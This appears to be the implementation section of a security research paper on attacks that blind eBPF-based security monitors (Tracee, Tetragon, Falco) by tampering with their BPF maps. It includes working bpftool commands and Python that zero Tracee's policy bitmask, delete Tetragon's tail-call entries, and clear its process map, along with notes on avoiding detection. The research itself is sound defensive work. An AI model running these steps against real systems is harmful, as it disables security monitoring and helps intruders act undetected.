# 5. Implementation

## 5.1 Toolchain

All attacks were implemented and verified using standard Linux BPF userspace utilities and scripting tools. No custom kernel modules, BPF programs, or compiled binaries were required.

**`bpftool`** (from linux-tools package): Used for map enumeration (`bpftool map list`), map inspection (`bpftool map dump`), map modification (`bpftool map update`, `bpftool map delete`), and pinned map access. `bpftool` wraps the `bpf(2)` syscall with a human-readable interface and supports JSON output for programmatic parsing.

**Python 3:** Used for JSON parsing of `bpftool` output, struct offset calculation, byte-level value construction, and orchestration of multi-step attack sequences. The only required module is `json` (standard library).

**Docker:** Used to deploy target security tools in their documented container configurations. Each tool was run with `--privileged` and `--pid=host` as recommended by their respective deployment guides, reflecting realistic production deployments.

**Shell (bash):** PoC scripts are implemented as self-contained bash scripts that automate the full five-phase protocol: setup, baseline measurement, poisoning, blindness verification, and restoration.

## 5.2 Map Discovery via BPF_MAP_GET_NEXT_ID

For tools that do not pin maps to the BPF filesystem (Tracee, Falco), map discovery uses the kernel's sequential ID enumeration interface.

The discovery algorithm proceeds as follows:

```
function discover_target_map(target_name, target_type):
    id = 0
    while true:
        id = bpf(BPF_MAP_GET_NEXT_ID, id)
        if id == -ENOENT: break
        fd = bpf(BPF_MAP_GET_FD_BY_ID, id)
        info = bpf(BPF_OBJ_GET_INFO_BY_FD, fd)
        if info.name matches target_name and info.type == target_type:
            return (id, fd, info)
    return NOT_FOUND
```

In the PoC implementation, this is performed via `bpftool map list -j` piped to a Python filter:

```python
maps = json.load(sys.stdin)
for m in maps:
    if m.get('name') == 'config_map' and m['type'] == 'array':
        print(m['id'])
```

For Falco, the map name may be truncated by the kernel's 16-character limit on BPF object names. We match on the prefix `interesting_sys` combined with type `array` and `max_entries == 512` to handle this case.

The enumeration is non-intrusive: it does not modify any state and does not trigger any events in the security tools being targeted. The `bpf(BPF_MAP_GET_NEXT_ID)` and `bpf(BPF_OBJ_GET_INFO_BY_FD)` syscalls are read-only operations that are not monitored by any of the tested tools.

## 5.3 Pinned Map Filesystem Access

Tetragon pins all BPF maps to `/sys/fs/bpf/tetragon/`, organized by subsystem:

```
/sys/fs/bpf/tetragon/
    execve_map                                          # process tracking (HASH)
    __base__/
        event_execve/
            execve_calls                                # tail call dispatch (PROG_ARRAY)
```

Pinned maps are accessed via `bpf(BPF_OBJ_GET, pathname)`, which returns a file descriptor with the same read/write capabilities as `BPF_MAP_GET_FD_BY_ID`. The pinned path structure is deterministic and version-stable, eliminating the need for enumeration entirely. This makes the Tetragon attack the most operationally simple: the attacker needs only the pinned path and a `bpftool map delete` command.

From a security perspective, map pinning increases the attack surface: it provides a stable, predictable access path that does not require the attacker to enumerate map IDs, and the filesystem path structure reveals the tool's internal architecture (map names, subsystem organization).

## 5.4 Struct Layout Analysis and Offset Calculation

The Tracee attack requires precise knowledge of the `config_entry_t` struct layout to locate the `enabled_policies` and `policies_version` fields within the 256-byte map value. We determined offsets through two complementary methods.

**Source code analysis.** The `config_entry_t` struct is defined in `pkg/ebpf/c/types.h` in the Tracee source tree. For v0.24.1:

```c
typedef struct config_entry {
    u32 tracee_pid;              // offset 0,  size 4
    u32 options;                 // offset 4,  size 4
    u32 cgroup_v1_hid;           // offset 8,  size 4
    u16 padding;                 // offset 12, size 2
    u16 policies_version;        // offset 14, size 2
    /* ... additional fields ... */
    u64 enabled_policies;        // offset 216, size 8
} config_entry_t;
```

**Runtime verification.** We verified offsets by dumping the map value with `bpftool map dump id <ID> -j`, parsing the byte array, and confirming that the `tracee_pid` field (offset 0-3) matches the PID of the Tracee process as observed via `ps`. The `enabled_policies` field (offset 216-223) was confirmed to contain a non-zero value (representing the active policy bitmask) in baseline operation and zero after poisoning.

The struct layout is version-dependent. Between Tracee releases, field additions or reorderings can shift offsets. The PoC addresses this by reading the full map value, modifying only the target bytes, and writing back the complete value -- ensuring that unrelated fields are preserved regardless of layout changes. A production implementation of this attack would require version detection (via process binary version strings or BPF program names) and offset lookup tables.

## 5.5 Version-Aware Caching Bypass

Tracee implements a performance optimization where BPF programs cache the `config_entry_t` values in per-CPU storage. The cache is keyed by `policies_version`: each BPF program invocation compares the current map version against its cached version. If they match, the cached (stale) values are used.

This caching mechanism is a defense against frequent map reads but creates a subtle requirement for the attacker: simply zeroing `enabled_policies` without modifying `policies_version` would have no immediate effect, as BPF programs would continue using their cached copy of the old (non-zero) `enabled_policies` value. The poisoned state would only take effect after Tracee's userspace daemon performs a configuration update that increments the version, which may not occur for hours or days.

Our implementation addresses this by atomically bumping `policies_version` alongside zeroing `enabled_policies`. The version increment forces all BPF program instances to invalidate their caches on the next invocation and re-read the poisoned configuration. Because the update is performed via a single `bpf(BPF_MAP_UPDATE_ELEM)` call that writes the entire 256-byte value, the version bump and policy zeroing are applied atomically from the BPF program's perspective.

```python
# Read current value
val_ints = parse_map_value(bpftool_dump(map_id))

# Extract current version
current_version = int.from_bytes(bytes(val_ints[14:16]), 'little')

# Zero enabled_policies (offset 216-223)
for i in range(216, 224):
    val_ints[i] = 0

# Bump version to invalidate caches
new_version = current_version + 1
val_ints[14] = new_version & 0xFF
val_ints[15] = (new_version >> 8) & 0xFF

# Write poisoned value (single atomic update)
bpftool_update(map_id, key=0, value=val_ints)
```

## 5.6 Prog_Array Deletion Semantics

The Tetragon attack exploits a specific property of `BPF_MAP_TYPE_PROG_ARRAY` maps: unlike regular array maps (where entries cannot be deleted), prog\_array entries *can* be deleted via `bpf(BPF_MAP_DELETE_ELEM)`. After deletion, `bpf_tail_call()` targeting the deleted index silently fails -- it does not return an error code, does not set errno, and does not terminate the calling program. Execution simply continues at the instruction following the `bpf_tail_call()` invocation.

This behavior is documented in the kernel's BPF helper documentation and is by design: `bpf_tail_call()` is intended to support optional extensions where the absence of a tail call target is a valid condition (e.g., optional protocol parsers in XDP programs). However, when security tools use tail calls as mandatory pipeline stages, this silent-failure semantic becomes a vulnerability: deleting the tail call target silently disables a critical processing stage without any error propagation.

The deletion is performed via:

```bash
bpftool map delete pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls \
    key hex 00 00 00 00
bpftool map delete pinned /sys/fs/bpf/tetragon/__base__/event_execve/execve_calls \
    key hex 01 00 00 00
```

Each deletion is instantaneous and affects all subsequent `bpf_tail_call()` invocations targeting that index, across all CPUs.

## 5.7 Hash Map Clearing

The Tetragon `execve_map` clearing requires iterating over all entries in a hash map and deleting them individually. Unlike array maps, hash maps do not have predictable keys -- entries are indexed by PID, which must be discovered via `bpf(BPF_MAP_GET_NEXT_KEY)`.

The clearing algorithm:

```
function clear_hash_map(map_fd):
    key = NULL  // start iteration
    while true:
        next_key = bpf(BPF_MAP_GET_NEXT_KEY, map_fd, key)
        if next_key == -ENOENT: break
        bpf(BPF_MAP_DELETE_ELEM, map_fd, next_key)
        // Note: after deletion, restart iteration from NULL
        // because BPF_MAP_GET_NEXT_KEY behavior after deletion
        // is implementation-defined for hash maps
        key = NULL
```

In the PoC, this is implemented by first dumping all entries via `bpftool map dump`, collecting keys, and then deleting each key individually. This two-pass approach avoids iterator invalidation issues and is reliable across kernel versions.

## 5.8 Execution Characteristics

All three attacks share the following operational properties:

**Execution time.** The Tracee and Tetragon attacks execute in under 100 milliseconds (single map update or two map deletions). The Falco attack requires 512 individual map updates, completing in approximately 2-3 seconds on tested hardware. A compiled C implementation using batch operations (`BPF_MAP_UPDATE_BATCH`, kernel 5.6+) could reduce this to under 10 milliseconds.

**System impact.** No observable impact on system performance, memory usage, or CPU utilization. Map updates are O(1) for array maps and O(1) amortized for hash map deletions.

**Detectability.** The `bpf(2)` syscall invocations used in the attack are not monitored by any of the tested tools. Tracee monitors `bpf` syscalls as a configurable event type, but the `config_map` poisoning disables this monitoring before any detection can occur (the poisoning itself is the first `bpf` syscall the attacker issues against the tool's maps). A race condition exists in theory but is not observable in practice due to the atomicity of the map update.
